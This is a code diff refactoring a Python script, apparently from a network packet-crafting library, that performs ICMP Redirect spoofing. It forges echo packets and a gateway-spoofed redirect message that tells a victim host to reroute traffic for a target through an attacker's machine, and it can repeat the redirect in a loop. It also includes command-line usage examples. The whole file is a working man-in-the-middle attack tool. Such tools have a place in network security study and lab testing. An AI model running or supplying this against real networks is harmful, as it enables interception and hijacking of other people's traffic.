@@ -1,95 +1,104 @@
-from agave.frames import ethernet, ip, icmp
+"""ICMP Redirect utilities.
+
+Usage of the script:
+	python3 -m agave.icmp.redirect <target> <attacker> <victim> <gateway> [delta] 
+		[trigger]
+
+Example:
+	python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
+	python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1 5
+	python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1 5 1
+
+"""
+import socket, time, sys
+from agave.frames import ip, icmp
 from agave.frames.core import Buffer
-from ipaddress import ip_address, ip_network, IPv4Address
-import socket, time
+from ipaddress import IPv4Address
 
 
-def build_frame(destination: IPv4Address, source: IPv4Address, payload: bytes) -> bytes:
-	buf = Buffer.from_bytes()
-	ip_frame = ip.IPv4(
-		ihl=5, dscp=0, ecn=0, total_length=( 20 + len(payload)), identification=0,
-		flags=2, # don't fragment
-		fragment_offset=0, ttl=64, protocol=ip.PROTO_ICMP, checksum=0,
-		source=source.packed,
-		destination=destination.packed,
-		options=b''
-	)
-	ip_frame.set_checksum()
-	ip_frame.write_to_buffer(buf)
-	buf.write(payload)
-	return bytes(buf)
-
-
-def build_messages(
-	victim: IPv4Address,
+def redirect(
 	target: IPv4Address,
-	gway: IPv4Address,
-	attacker: IPv4Address
+	attacker: IPv4Address,
+	victim: IPv4Address,
+	gateway: IPv4Address,
+	trigger_echo_reply: bool = False,
+	repeat_redirect: float = 0
 ):
-	# Build a echo message to trigger victim response
+	"""
+	Using ICMP Redirect messages, informs <victim> that a better route (compared
+	to the one with <gateway>) to reach <target> exists through <attacker>.
+	ICMP Redirect messages must contain the original message which pushed the
+	router to suggest an alternative way. For this scope, the function creates
+	a fake ICMP echo reply message sent by <victim> to <target>. An additional
+	ICMP echo request <target> to <victim> is created, and can be optionally
+	sent to trigger <victim> into actually sending a reply similar to the fake
+	one included in the ICMP redirect message.
+
+	Args:
+		target: <target> IP.
+		attacker: IP of the router the <victim> should use to reach <target>.
+		victim: <victim> IP.
+		gateway: IP of the router the <victim> use to reach <target>.
+		trigger_echo_reply: if true, the optional echo request is sent.
+		repeat_redirect: delta time in seconds before to repeat the process. 0
+			or less to prevent repetition.
+
+	"""
+	# Creates a raw socket and prevents kernel from adding the IP layer 
+	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+	# Builds the packet
+	# 	Echo request sent by <target> to <victim>.
 	buf_1 = Buffer.from_bytes()
 	icmp_frame = icmp.ICMP.echo(b'abcdefghijklmnopqrstuvwyxz')
 	icmp_frame.set_checksum()
 	icmp_frame.write_to_buffer(buf_1)
-	trigger_message = build_frame(victim, target, bytes(buf_1))
-
-	# Guessed victim response
+	target_req = ip.IPv4.create_message(victim, target, bytes(buf_1), ip.PROTO_ICMP)
+	# 	Guessed <victim> response to the echo request above.
 	buf_2 = Buffer.from_bytes()
 	icmp_frame = icmp.ICMP.reply(b'abcdefghijklmnopqrstuvwyxz')
 	icmp_frame.set_checksum()
 	icmp_frame.write_to_buffer(buf_2)
-	victim_response = build_frame(target, victim, bytes(buf_2))
-
-	# Malioucius redirect message from gateway
+	victim_res = ip.IPv4.create_message(target, victim, bytes(buf_2), ip.PROTO_ICMP)
+	# 	Malioucius redirect message from gateway.
 	buf_3 = Buffer.from_bytes()
 	icmp_frame = icmp.ICMP.redirect(
 		icmp.REDIRECT_CODE_HOST,
-		attacker._ip, # address of the router to use instead
-		victim_response	# message that triggered the redirect
+		attacker._ip, 				# address of the router to use instead
+		victim_res					# message that triggered the redirect
 	)
 	icmp_frame.set_checksum()
 	icmp_frame.write_to_buffer(buf_3)
-	redirect_message = build_frame(victim, gway, bytes(buf_3))
-
-	return trigger_message, redirect_message
-
-
-def redirect(rawsock, target: str, attacker: str, victim: str, gateway: str):
-	"""
-	First sends to {victim} a echo request coming from the {target}, so to trigger
-	a response.
-	Second, sends a redirect message to the {victim} suggesting a better way to reach
-	{target} through {attacker}.
-	"""
-	trigger_message, redirect_message = build_messages(
-		ip_address(victim),
-		ip_address(target),
-		ip_address(gateway),
-		ip_address(attacker)
-	)
-	rawsock.sendto(trigger_message, (victim, 0))
-	time.sleep(0.2)
-	rawsock.sendto(redirect_message, (victim, 0))
+	redirect_mex = ip.IPv4.create_message(victim, gateway, bytes(buf_3), ip.PROTO_ICMP)
+	# Send the data
+	repeat_flag = repeat_redirect > 0
+	while True:
+		if trigger_echo_reply is True:
+			# Trigger the victim to send an ICMP Echo reply to the target
+			sock.sendto(target_req, (str(victim), 0))
+			time.sleep(1)
+		# Send redirect to the victim
+		sock.sendto(redirect_mex, (str(victim), 0))
+		# Break or sleep
+		if not repeat_flag:
+			break
+		else:
+			time.sleep(repeat_redirect)
 
 
 if __name__ == "__main__":
-	"""
-	ICMP Redirect
-
-	Usage:
-		python3 -m agave.icmp.redirect <target> <attacker> <victim> <gateway>
-
-	Example:
-		python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
-	
-	"""
-	import sys
-
 
 	if len(sys.argv) < 5:
 		print("Too few parameters")
 	else:
-		rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-		rawsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-		redirect(rawsocket, *tuple(sys.argv[1:]))
+		repeat = float(sys.argv[5]) if len(sys.argv) > 5 else 0
+		trigger = (int(sys.argv[6]) > 0) if len(sys.argv) > 6 else False
+		redirect(
+			IPv4Address(sys.argv[1]),
+			IPv4Address(sys.argv[2]),
+			IPv4Address(sys.argv[3]),
+			IPv4Address(sys.argv[4]),
+			trigger_echo_reply=trigger,
+			repeat_redirect=repeat
+		)
 
